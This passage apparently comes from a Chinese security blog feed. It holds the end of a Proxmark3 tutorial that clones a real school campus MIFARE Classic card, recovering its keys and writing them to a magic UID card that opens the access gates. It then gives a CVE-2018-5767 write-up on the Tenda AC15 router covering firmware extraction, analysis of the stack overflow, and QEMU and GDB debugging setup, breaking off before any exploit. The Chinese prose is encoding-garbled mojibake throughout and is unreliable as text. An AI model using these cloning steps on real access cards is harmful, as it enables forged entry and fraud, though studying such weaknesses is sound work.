<p>åœ¨ github ä¸Šé¢æœ‰ proxmark çš„å®˜æ–¹å›ºä»¶å’Œå·¥å…·ï¼Œç”¨æ¥æ“æ§ proxmark ç¡¬ä»¶ï¼Œä¸è¿‡å…¶å‘½ä»¤è¡Œæ¨¡å¼æ¯”è¾ƒéš¾ç”¨ï¼Œå› æ­¤ï¼Œå›½å†…çš„ä¸€äº›å¼€å‘è€…ç»™å‘½ä»¤è¡Œå¥—ä¸Šäº†ä¸€ä¸ªå¤–å£³ï¼Œåˆ¶ä½œå‡ºå…·æœ‰ä¸­æ–‡ç•Œé¢çš„ GUI ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦åšçš„åªå‰©ä¸‹è£…é©±åŠ¨äº†ã€‚å¦‚æœä½ æ˜¯åœ¨æ·˜å®è´­ä¹°çš„ ProXmarkï¼Œåº—å®¶ä¼šèµ é€ä¸€äº›èµ„æ–™å’Œé©±åŠ¨å®‰è£…æ•™ç¨‹ï¼Œåªéœ€è¦æŒ‰ç…§æ•™ç¨‹ä¸€æ­¥ä¸€æ­¥æ“ä½œï¼Œåº”è¯¥ä¸æˆé—®é¢˜ã€‚</p>
<h3 id="å¡ç‰‡å¤åˆ¶"><a href="#å¡ç‰‡å¤åˆ¶" class="headerlink" title="å¡ç‰‡å¤åˆ¶"></a>å¡ç‰‡å¤åˆ¶</h3><p>å¤åˆ¶å¡ç‰‡æ˜¯ RFID æœ€ç®€å•çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œè™½ç„¶ä¸Šé¢è®²åˆ° M1 å¡çš„ç§ç§å®‰å…¨æœºåˆ¶ï¼Œä½†å®é™…ä¸Šæ—©åœ¨ 2008 å¹´ M1 å¡å°±è¢«çˆ†å‡ºæœ‰ä¸¥é‡çš„æ¼æ´ï¼Œæ‰‡åŒºåŠ å¯†å½¢åŒè™šè®¾ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ä»»æ„ä¸€ä¸ªæ‰‡åŒºçš„å¯†é’¥(A æˆ– Bï¼Œå¯ä»¥é€šè¿‡å¯†é’¥çˆ†ç ´)ï¼Œå°±èƒ½é€šè¿‡æ¼æ´æ±‚å‡ºæ•´å¼ å¡ç‰‡å…¨éƒ¨çš„å¯†é’¥ï¼Œè¿™ä¸€æ¼æ´æœ€ç›´æ¥çš„å½±å“å°±æ˜¯å¡ç‰‡å¤åˆ¶ï¼Œè¦çŸ¥é“å½“æ²¡æœ‰å¯†é’¥çš„æ—¶å€™å¡ç‰‡ä¸­çš„æ•°æ®ä¸èƒ½è¢«è¯»å–(å°±ç®—è¯»å‡ºæ¥ä¹Ÿæ˜¯æ— ç”¨æ•°æ®)ï¼Œä½†æ˜¯é€šè¿‡åˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å°±æœ‰æœºä¼šè®¡ç®—å‡ºæ•´å¼ å¡çš„å¯†é’¥ï¼Œä»è€Œè·å–å¡ä¸­çš„å®Œæ•´æ•°æ®ï¼Œè¿™æ—¶å†ç»“åˆ UID å¡çš„éšæ„è¯»å†™æœºåˆ¶ï¼Œæ”»å‡»è€…èƒ½å¤Ÿå¯¹æ­£å¸¸çš„å¡ç‰‡è¿›è¡Œä¼ªé€ ï¼Œåæœå¯æƒ³è€ŒçŸ¥ã€‚</p>
<p>æˆ‘ä»¬ä»¥ ** å­¦æ ¡æ ¡å›­å¡ä¸ºä¾‹ï¼Œå°è¯•å¡ç‰‡å¤åˆ¶ã€‚</p>
<p>é¦–å…ˆå°† proxmark3 è¿æ¥åˆ°ç”µè„‘ï¼Œæ‰“å¼€è½¯ä»¶ï¼Œå¦‚æœé©±åŠ¨æ²¡æœ‰å¼‚å¸¸ï¼Œè½¯ä»¶åº”è¯¥å¯ä»¥è‡ªåŠ¨è¯†åˆ«å‡ºä¸²å£å·ï¼Œå¦‚æœæ²¡æœ‰å°±æ‰‹åŠ¨è®¾ç½®ã€‚æœ€ç»ˆç•Œé¢åº”è¯¥å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-6.jpg"
                     
                ></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç‚¹å‡»å¤©çº¿ç”µå‹æŒ‰é’®æµ‹è¯•ç¡¬ä»¶æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚ç‚¹å‡»åæ¿ä¸Šçš„è“ç¯å’Œçº¢ç¯åŒæ—¶äº®èµ·ï¼Œç„¶åè“ç¯ç†„ç­ï¼Œçº¢ç¯å¸¸äº®ï¼Œè¡¨ç¤ºæ­£åœ¨æµ‹è¯•ç”µå‹ï¼Œæµ‹è¯•ç»“æŸå¾—å‡ºå¦‚ä¸‹ç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] LF antenna: 26.34 V - 125.00 kHz          </span><br><span class="line">[+] LF antenna: 31.58 V - 134.00 kHz          </span><br><span class="line">[+] LF optimal: 31.44 V - 131.87 kHz          </span><br><span class="line">[+] LF antenna is OK  </span><br><span class="line">          </span><br><span class="line">[+] HF antenna: 10.55 V - 13.56 MHz          </span><br><span class="line">[+] HF antenna is OK           </span><br><span class="line">          </span><br><span class="line">[+] Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</span><br></pre></td></tr></table></figure></div>

<p>æç¤ºä½é¢‘ç”µå‹å’Œé«˜é¢‘ç”µå‹ç¨³å®šï¼Œç¡¬ä»¶è¿è¡Œæ­£å¸¸ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°†å¾…å¤åˆ¶çš„å¡ç‰‡æ”¾åœ¨æ¿å­çš„é«˜é¢‘å¡é˜…è¯»åŒºåŸŸï¼Œç‚¹å‡»è½¯ä»¶ä¸­çš„è¯»IC å¡ç±»å‹è¿”å›äº†ä»¥ä¸‹ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> UID : E0 F3 12 17           </span><br><span class="line">ATQA : 00 04          </span><br><span class="line"> SAK : 08 [2]          </span><br><span class="line">TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 | 1k Ev1          </span><br><span class="line">[=] proprietary non iso14443-4 card found, RATS not supported          </span><br><span class="line">[=] Answers to magic commands: NO          </span><br><span class="line">[+] Prng detection: WEAK          </span><br><span class="line">          </span><br><span class="line">[+] Valid ISO14443-A Tag Found</span><br></pre></td></tr></table></figure></div>

<p>å¡çš„ç±»å‹æ˜¯ MIFARE CLASSIC 1kï¼Œå¹¶ä¸”æç¤ºæˆ‘ä»¬ Prng detection: WEAK  ï¼Œè¡¨ç¤ºå¡ç‰‡å­˜åœ¨æ¼æ´ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡æ¼æ´ç ´è§£å‡ºæ•´å¼ å¡ç‰‡çš„å¯†ç ï¼</p>
<p>ç‚¹å‡»è½¯ä»¶ä¸­çš„é»˜è®¤å¯†ç æ‰«æï¼Œç„¶åç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè½¯ä»¶ä¼šè‡ªåŠ¨ä»å­—å…¸ä¸­åŠ è½½å¯†é’¥ï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªæ­£ç¡®çš„ keyï¼Œå½“æ‰¾åˆ°ä»»æ„ä¸€ä¸ª key ä¹‹åå°±èƒ½é€šè¿‡æ¼æ´è®¡ç®—å‡ºå…¨éƒ¨ keyï¼Œè¿›è€Œè§£ç å‡ºæ•´å¼ å¡ç‰‡çš„æ•°æ®ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-8.jpg"
                     
                ></p>
<p>è·å–åˆ°å®Œæ•´æ•°æ®å¯ä»¥å¼€å§‹å¤åˆ¶å¡ç‰‡ï¼Œé¦–å…ˆè¦æ‰¾åˆ°ä¸€å¼  UID å¡ï¼Œç¡®ä¿ 0 å·æ‰‡åŒºèƒ½æ­£å¸¸å†™å…¥ï¼Œå°†å¡æ”¾åœ¨é«˜é¢‘å¡è¯»å¡åŒºï¼Œç‚¹å‡» å†™ UID å¡ï¼Œå³å¯å°†æ•°æ®å†™å…¥ UID å¡å†…ï¼Œè‡³æ­¤æˆ‘ä»¬å·²ç»å®Œæˆäº†å¡ç‰‡çš„<strong>å¤åˆ¶æ“ä½œ</strong>ï¼Œå°† UID å¡é‡æ–°è¯»å–</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> UID : E0 F3 12 17           </span><br><span class="line">ATQA : 00 04          </span><br><span class="line"> SAK : 08 [2]          </span><br><span class="line">TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 | 1k Ev1          </span><br><span class="line">[=] proprietary non iso14443-4 card found, RATS not supported          </span><br><span class="line">[+] Answers to magic commands (GEN 1a): YES          </span><br><span class="line">[+] Prng detection: WEAK          </span><br><span class="line">          </span><br><span class="line">[+] Valid ISO14443-A Tag Found</span><br></pre></td></tr></table></figure></div>

<p>æç¤ºæˆ‘ä»¬å‘ç°äº† UID å¡ï¼Œå¯¹åé—¨æŒ‡ä»¤å­˜åœ¨å“åº”ã€‚</p>
<p>å–å‡ºçš„æ•°æ®å’ŒåŸå§‹å¡ç‰‡ä¹Ÿæ˜¯ç›¸åŒçš„ï¼ç»æµ‹è¯•å¤åˆ¶å¡èƒ½å¤Ÿæ­£å¸¸é€šè¿‡é—¨ç¦é—¸æœºï¼Œ<strong>æ²¡æœ‰å¯¹æ¶ˆè´¹è¿›è¡Œæµ‹è¯•!</strong></p>
<p><strong>RFID ä»…ä¸ºæŠ€æœ¯ç ”ç©¶ï¼Œè¯·ä¸è¦æ‰§è¡Œéæ³•æ“ä½œï¼</strong></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2018-5767</title>
    <url>/2019/03/19/CVE-2018-5767/</url>
    <content><![CDATA[<p>CVE-2018-5767 æ˜¯ TENDA-AC15 å‹å·è·¯ç”±å™¨ä¸Šçš„ä¸€ä¸ªæ¼æ´ï¼Œäº§ç”Ÿçš„åŸå› æ˜¯æ²¡æœ‰é™åˆ¶ç”¨æˆ·çš„è¾“å…¥ï¼Œä½¿ç”¨å‡½æ•° sscanf ç›´æ¥å°†è¾“å…¥æ‹·è´åˆ°æ ˆä¸Šï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<p>å­˜åœ¨è¯¥æ¼æ´çš„å›ºä»¶æ˜¯ Tenda cn Ac15_firmware:15.03.1.16</p>
<span id="more"></span>

<h2 id="æå–å›ºä»¶"><a href="#æå–å›ºä»¶" class="headerlink" title="æå–å›ºä»¶"></a>æå–å›ºä»¶</h2><p>é¦–å…ˆéœ€è¦æ˜ç¡®ä¸€ç‚¹ï¼ŒIoT è®¾å¤‡çš„ç³»ç»Ÿé€šå¸¸ä¸ linuxã€Windows ä¸åŒï¼Œç”±äºè®¾å¤‡çš„èµ„æºæœ‰é™ï¼Œå®ƒä»¬çš„æ“ä½œç³»ç»Ÿç›¸å¯¹æ¯”è¾ƒç®€æ´ï¼Œè€Œä¸”è®¸å¤š IOT è®¾å¤‡ä½¿ç”¨çš„éƒ½æ˜¯ä¸€äº›ä¸æ˜¯å¾ˆå¸¸è§çš„æŒ‡ä»¤é›†(å¤šæ•°ä½¿ç”¨äº†ç²¾ç®€æŒ‡ä»¤é›†)ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬äº†è§£è¿™äº› CPU æ¶æ„ä»¥åŠæŒ‡ä»¤é›†çš„ç‰¹æ€§ï¼Œæ‰èƒ½åˆ†æå›ºä»¶ä¸­çš„ç¨‹åºã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼ŒTENDA(è‡³å°‘æ˜¯ AC15)çš„ CPU æ˜¯ ARM æ¶æ„çš„ï¼Œæå–çš„ç¨‹åºå¯ä»¥ç›´æ¥ä½¿ç”¨ IDA è¿›è¡Œåç¼–è¯‘ã€‚</p>
<p>é¦–å…ˆè¦ä¸‹è½½å®˜æ–¹çš„è·¯ç”±å™¨è½¯ä»¶åŒ…ï¼Œæ‰“å¼€TENDA çš„å®˜ç½‘ï¼Œåœ¨é‡Œé¢æ‰¾åˆ° AC15 è·¯ç”±å™¨çš„æ”¯æŒé¡µé¢ä¸‹è½½å›ºä»¶ï¼Œ<a class="link"   href="https://www.tenda.com.cn/product/support/AC15.html" >é“¾æ¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>ä¸‹è½½åˆ°æœ¬åœ°çš„æ˜¯ä¸€ä¸ª.bin æ–‡ä»¶ï¼Œå¤§å°çº¦ä¸º 10 MBï¼Œfile ä¸€ä¸‹å‘ç°è¿™å…¶å®æ˜¯ä¸€ä¸ªè¿·ä½ çš„é•œåƒ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">âœ  Desktop file US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin </span><br><span class="line">US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin: u-boot legacy uImage, \002, Linux/ARM, OS Kernel Image (lzma), 10227712 bytes, Thu Nov 19 09:36:45 2015, Load Address: 0x80000000, Entry Point: 0xC0008000, Header CRC: 0x73CF0D74, Data CRC: 0x3321F349</span><br></pre></td></tr></table></figure></div>

<p>file æŒ‡å‡ºå®ƒæ˜¯ u-boot legacy uImage æ ¼å¼çš„é•œåƒæ–‡ä»¶ï¼Œåœ¨ç™¾åº¦ä¸Šå¯ä»¥æ‰¾åˆ°ä¸€äº›è¯¦ç»†çš„è§£é‡Šï¼Œç®€å•æ¥è¯´ï¼Œå®ƒå°±æ˜¯ Linux ä¸º ARM æ¶æ„æ‰“é€ çš„å°å‹å¯åŠ¨é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒç†è§£ä¸ºç±»ä¼¼äº IOS çš„é•œåƒã€‚</p>
<p>æ—¢ç„¶æ˜¯é•œåƒï¼Œå°±èƒ½å¤Ÿé€šè¿‡ä¸€äº›æ‰‹æ®µæ¥æå–å®ƒå†…éƒ¨çš„æ–‡ä»¶ï¼Œé¦–å…ˆæ˜ç¡®æ­¤é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ binwalk ï¼Œä»¥è¿™ä¸ªå›ºä»¶ä¸ºä¾‹ï¼Œç”¨ binwalk è·‘ä¸€ä¸‹å¾—åˆ°çš„ä¿¡æ¯ï¼š</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">\--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            TRX firmware header, little endian, image size: 10227712 bytes, CRC32: 0x314DBDAC, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x198CDC, rootfs offset: 0x0</span><br><span class="line">92            0x5C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4114848 bytes</span><br><span class="line">1674524       0x198D1C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: 2015-11-19 09:36:43 </span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸‰é¡¹æŒ‡å‡ºäº†é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ä¸ºSquashfsï¼Œç±»ä¼¼çš„æ–‡ä»¶æ ¼å¼è¿˜æœ‰è®¸å¤šï¼Œä¸€èˆ¬éƒ½èƒ½è¢« binwalk æ‰€è¯†åˆ«ã€‚</p>
<p>æ¥ç€å°±å¯ä»¥ç€æ‰‹å°†æ–‡ä»¶ç³»ç»Ÿå–å‡ºæ¥ï¼Œä½¿ç”¨dd å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin bs=1 count=8549574 skip=1674524 of=image</span><br></pre></td></tr></table></figure></div>

<p>if å‚æ•°è®¾ç½®è¾“å…¥çš„æ–‡ä»¶ï¼Œbs æ˜¯è¾“å…¥è¾“å‡ºå—çš„å¤§å°ï¼Œcount æ˜¯è¾“å…¥è¾“å‡ºå—çš„ä¸ªæ•°(æŠ½å–çš„æ€»å­—èŠ‚æ•°å¯ä»¥ç†è§£ä¸º bs * count)ï¼Œskip æ˜¯ä»æ–‡ä»¶å¤´å¼€å§‹çš„åç§»é‡ï¼Œof æŒ‡å®šè¾“å‡ºå­—èŠ‚çš„ä¿å­˜ä½ç½®ï¼Œè¿™äº›æ•°æ®åœ¨ binwalk ä¸­éƒ½èƒ½æ‰¾åˆ°ã€‚</p>
<p>æ‰§è¡Œè¿™æ¡å‘½ä»¤éœ€è¦æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œè·‘å®Œå¾—åˆ°ä¸€ä¸ªåä¸ºimage çš„æ–‡ä»¶ï¼Œè¿™æ—¶å†æ¥ file ä¸€ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">image: Squashfs filesystem, little endian, version 4.0, 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: Thu Nov 19 09:36:43 2015</span><br></pre></td></tr></table></figure></div>

<p>æ–‡ä»¶ç³»ç»Ÿå·²ç»æå–å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è§£å‹å‡ºæ–‡ä»¶ï¼Œå’Œ NTFS FAT32 ç±»ä¼¼ï¼ŒSquashfs æ˜¯ä¸€ç§ç£ç›˜æ ¼å¼ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ¥å·¥å…·è§£ç æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°çš„å·¥å…·æ˜¯ squashfs-toolsï¼Œåœ¨ github ä¸Šé¢èƒ½æ‰¾åˆ°æºä»£ç ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç›´æ¥å®‰è£…</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">./configure</span><br><span class="line">make </span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ‰¾åˆ°å·¥å…·ä¸­çš„unsquashfs_all.shï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è§£å‹é•œåƒ</p>
<p>unsquashfs_all.sh image </p>
<p>åˆ°è¿™é‡Œï¼Œè·¯ç”±å™¨çš„å›ºä»¶å·²ç»è¢«æå–å‡ºæ¥äº†ï¼Œä¸‹é¢å‡†å¤‡å¤ç°æ¼æ´ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨bin æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ httpd ï¼Œä½¿ç”¨ checksec çœ‹ä¸€ä¸‹å¼€å¯çš„ä¿æŠ¤ï¼š</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-1.png"
                      alt="image"
                ></p>
<p><strong>æ³¨ï¼šéƒ¨åˆ†æƒ…å†µä¸‹checksec æ£€æµ‹çš„ç»“æœå¹¶ä¸å‡†ç¡®ï¼Œéœ€è¦é€šè¿‡åŠ¨æ€è°ƒè¯•è¿›ä¸€æ­¥ç¡®å®šã€‚</strong></p>
<p>32 ä½ç¨‹åºï¼Œåªå¼€å¯äº† NXï¼Œä¸¢è¿› IDA å¼€å§‹åˆ†æï¼Œç”±äºæ˜¯å¤ç°æ¼æ´ï¼Œæ‰€ä»¥ç›´æ¥å®šä½åˆ°å‡½æ•° <strong>R7WebsSecurityHandler</strong>ï¼ŒæŒ‰F5 æŸ¥çœ‹åç¼–è¯‘ä»£ç (ä»£ç æ¯”è¾ƒå¤šï¼ŒåªæŠŠå…³é”®çš„åœ°æ–¹æ”¾ä¸Šæ¥)</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-2.png"
                      alt="image"
                ></p>
<p>ç»“åˆä¸Šä¸‹æ–‡æ¥ç†è§£è¿™æ®µä»£ç ï¼Œç¬¬100 è¡Œä½¿ç”¨äº†å‡½æ•° strstr å°è¯•åœ¨ (v22 + 46) å¤„æ‰¾åˆ° â€œpassword&#x3D;â€ å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå…¶ä¸­ v22 + 46 æ˜¯ç”¨æˆ·çš„ HTTP è¯·æ±‚ï¼Œpassword æ˜¯è¯·æ±‚ä¸­ cookie çš„ä¸€ä¸ªå­—æ®µï¼Œå¦‚æœæ‰¾åˆ°äº† passwordï¼Œå°±ä¼šè¿›å…¥æ¥ä¸‹æ¥çš„é€»è¾‘ï¼Œåœ¨ç¬¬ 102 è¡Œè°ƒç”¨äº†å‡½æ•° sscanfï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é… â€œpassword&#x3D;â€ ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œå¹¶å°†åŒ¹é…å‡ºçš„ç»“æœå­˜å…¥å˜é‡ v35 ä¸­ï¼Œç»“åˆ v35 çš„å˜é‡å®šä¹‰</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">char v35; // [sp+304h] [bp-1C0h]</span><br></pre></td></tr></table></figure></div>

<p>å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯å­˜åœ¨æ ˆæº¢å‡ºçš„ï¼Œä»£ç æ²¡æœ‰åˆ¤æ–­å­—æ®µçš„æœ€å¤§é•¿åº¦ï¼Œç›´æ¥å°†å†…å®¹æ‹·è´åˆ°æ ˆä¸Šï¼Œå¦‚æœç”¨æˆ·ç²¾å¿ƒæ„é€ ä¸€ä¸ªpasswordï¼Œé‚£ä¹ˆå¯èƒ½æœ‰æœºä¼šæ§åˆ¶æ•´ä¸ªç¨‹åºçš„æµç¨‹ï¼Œè¿›è€Œè¾¾åˆ°è¿œç¨‹æ‰§è¡Œä»£ç çš„ç›®çš„ã€‚</p>
<p>åœ¨å¤ç°æ¼æ´çš„æ—¶å€™ç»å¸¸ä¼šæ‘¸ä¸åˆ°å¤´è„‘ï¼Œæ¯”å¦‚å‡­ä»€ä¹ˆè¯´v22 + 46 ä»£è¡¨ http è¯·æ±‚ï¼Œè¿™ä¸ªå‡½æ•°ç©¶ç«Ÿæƒ³è¦å¹²ä»€ä¹ˆç­‰ç­‰ï¼ŒåŠ ä¸Šæ²¡æœ‰çœŸæ­£çš„è·¯ç”±å™¨ï¼Œä¸€åˆ‡åªèƒ½åœ¨ qemu ä¸­æ¨¡æ‹Ÿï¼Œæƒ³è¦çœŸæ­£ä»æ ¹æœ¬ä¸Šç†è§£æ¼æ´çš„æˆå› æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œè§£å†³åŠæ³•åªèƒ½æ˜¯ä¸æ–­åœ°åˆ†æå…³é”®å‡½æ•°å¹¶ä¸”æ ¹æ®ç¨‹åºåŠŸèƒ½çŒœæµ‹è¿™äº›ç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œæœ‰æ¡ä»¶çš„è¯å¯ä»¥è€ƒè™‘ææ¥ä¸€å°è·¯ç”±å™¨æ¨¡æ‹ŸçœŸå®çš„ç¯å¢ƒï¼Œè¿™æˆ–è®¸èƒ½å¤Ÿè§£å†³ä¸€éƒ¨åˆ†é—®é¢˜ã€‚</p>
<h2 id="æ­å»ºè°ƒè¯•ç¯å¢ƒ"><a href="#æ­å»ºè°ƒè¯•ç¯å¢ƒ" class="headerlink" title="æ­å»ºè°ƒè¯•ç¯å¢ƒ"></a>æ­å»ºè°ƒè¯•ç¯å¢ƒ</h2><p><strong>æ“ä½œä¹‹å‰å…ˆæ‹æ‘„å¿«ç…§ï¼</strong></p>
<p>åœ¨ä»å‰ï¼Œæƒ³è¦è·¨å¹³å°æ¨¡æ‹Ÿè¿è¡Œå…¶ä»–å¹³å°çš„ç¨‹åºæ˜¯å¾ˆå›°éš¾çš„ï¼Œå¹¸å¥½ä¸€è·¯å¤§ä½¬å¼€å‘å‡ºäº†QEMUï¼Œå…³äº QEMU çš„å…·ä½“ä¿¡æ¯å¯åœ¨å…¶å®˜æ–¹ç½‘ç«™ä¸Šæ‰¾åˆ°ï¼Œå®é™…ä¸Šå®ƒå°±æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œèƒ½å¤Ÿè™šæ‹Ÿå¤§éƒ¨åˆ†ç¡¬ä»¶è®¾å¤‡ï¼ŒARM è‡ªç„¶ä¹ŸåŒ…æ‹¬åœ¨å†…ï¼Œä¸‹é¢æ˜¯ä¸€å¼ å…³äº QEMU çš„ç®€å›¾</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-3.png"
                      alt="image"
                ></p>
<p>å®ƒåœ¨å®¿ä¸»æœºä¸Šæ¨¡æ‹Ÿäº†ç›¸åº”ç¡¬ä»¶çš„ç¯å¢ƒï¼Œå¹¶åœ¨è¿™äº›æ¨¡æ‹Ÿçš„ç¯å¢ƒä¸Šé¢è¿è¡Œå®¢æˆ·ç³»ç»Ÿï¼Œè¿™ç§æœºåˆ¶ç±»ä¼¼äºVMwareï¼Œæ— éœ€å…³æœºé‡å¯ï¼Œå³å¯åœ¨ä¸€å¥—ç¡¬ä»¶ä¸Šè¿è¡Œå¤šç§ä¸åŒçš„ç³»ç»Ÿã€‚</p>
<p>æƒ³è¦è¿è¡Œæœ¬ä¾‹çš„ç¨‹åºï¼Œå°±éœ€è¦å…ˆæ­å»ºå¥½qemu çš„ç¯å¢ƒï¼Œå…·ä½“çš„æ“ä½œæ­¥éª¤å°±ä¸ç»†è¯´äº†ï¼Œåœ¨ç™¾åº¦ä¸Šæœ‰å¤§æŠŠçš„æ–‡ç« ï¼Œé‡ç‚¹æ˜¯å¦‚ä½•æ­å»º QEMU + GDB çš„è°ƒè¯•ç¯å¢ƒã€‚</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä½ å·²ç»æ­å»ºå¥½äº†qemuï¼Œåº”è¯¥å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯åŠ¨ httpd</p>
<p>qemu-arm -L &lt;æŠ½å–å‡ºçš„å›ºä»¶æ ¹ç›®å½•&gt; httpd</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-4.png"
                      alt="image"
                ></p>
<p><strong>å¦‚æœä¸èƒ½å¯åŠ¨ï¼Œå¯èƒ½æ˜¯ç”±äºQEMU æ²¡æœ‰è£…å¥½æˆ–è€… -L é€‰é¡¹çš„å‚æ•°ä¸æ­£ç¡®ã€‚</strong></p>
<p>æ¥ä¸‹æ¥è¦å®‰è£…æ”¯æŒå¤šç§æ¶æ„çš„gdb è°ƒè¯•å™¨ï¼Œ linux è‡ªå¸¦çš„ gdb å¹¶ä¸æ”¯æŒ ARM æŒ‡ä»¤é›†ï¼Œéœ€è¦å®‰è£… gdb-multiarch</p>
<p>sudo apt-get install gdb-multiarch </p>
<p>å®‰è£…å®Œæˆä¹‹åå¯åŠ¨çœ‹çœ‹æ˜¯å¦æ­£å¸¸ï¼Œæ¨èè£…ä¸Špwndbg è¿™ä¸ª gdb æ’ä»¶ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</p>
<p>å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œä¸‹é¢å°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ï¼Œé¦–å…ˆä½¿ç”¨qemu å°†ç¨‹åºè·‘èµ·æ¥</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm-static -g 1234 -L &lt;æŠ½å–å‡ºçš„å›ºä»¶æ ¹ç›®å½•&gt; httpd</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ‰“å¼€gdb-multiarchï¼Œä¾æ¬¡ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œåˆå§‹åŒ–è®¾ç½®å¹¶é™„åŠ åˆ°ç¨‹åºä¸Š</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set sysroot &lt;æŠ½å–å‡ºçš„å›ºä»¶æ ¹ç›®å½•&gt;</span><br><span class="line">file &lt;httpdæ–‡ä»¶çš„ä½ç½®&gt;</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-5.png"
                      alt="image"
                ></p>
